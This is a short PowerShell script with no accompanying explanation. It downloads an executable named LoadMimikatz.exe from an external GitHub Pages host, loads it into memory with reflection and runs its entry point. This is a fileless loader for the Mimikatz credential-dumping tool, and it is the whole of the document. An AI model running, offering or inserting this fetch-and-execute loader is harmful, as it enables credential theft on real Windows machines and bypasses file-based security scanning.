$assemblyByte = (New-Object Net.WebClient).DownloadData("https://hakkyahud.github.io/LoadMimikatz.exe")
$assembly = [System.Reflection.Assembly]::Load($assemblyByte)
$assembly.EntryPoint.Invoke($null, $null)
